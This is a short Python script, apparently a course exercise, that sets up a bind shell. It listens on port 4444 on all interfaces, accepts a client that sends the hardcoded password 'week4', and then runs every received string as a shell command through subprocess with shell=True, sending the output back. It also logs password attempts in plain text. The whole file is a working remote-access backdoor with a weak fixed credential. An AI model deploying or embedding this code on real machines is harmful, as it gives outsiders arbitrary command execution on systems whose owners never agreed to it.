import socket
import subprocess

HOST = ''
PORT = 4444

def start_server():
    print("[SERVER] Initializing...")
    server = socket.socket()
    server.bind((HOST, PORT))
    server.listen(1)
    print("[SERVER] Waiting for connection...")

    while True:
        try:
            client, address = server.accept()
            print(f"[SERVER] Connected to {address}")

            password = client.recv(1024).decode().strip()
            print(f"[LOGIN ATTEMPT] Password received: {password}")

            if password == "week4":
                client.send(b"success")
                print("[SERVER] Login successful.")
                handle_client(client)
            else:
                client.send(b"fail")
                print("[SERVER] Login failed.")
                client.close()
        except Exception as e:
            print(f"[SERVER ERROR] {e}")
            continue

def handle_client(client):
    while True:
        try:
            command = client.recv(1024).decode().strip()
            if not command or command.lower() == 'exit':
                break

            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            response = result.stdout + result.stderr
            if not response:
                response = "no stdout"

            client.send(response.encode())
        except Exception as e:
            print(f"[COMMAND ERROR] {e}")
            break

    client.close()
    print("[SERVER] Client disconnected.")

if __name__ == "__main__":
    start_server()
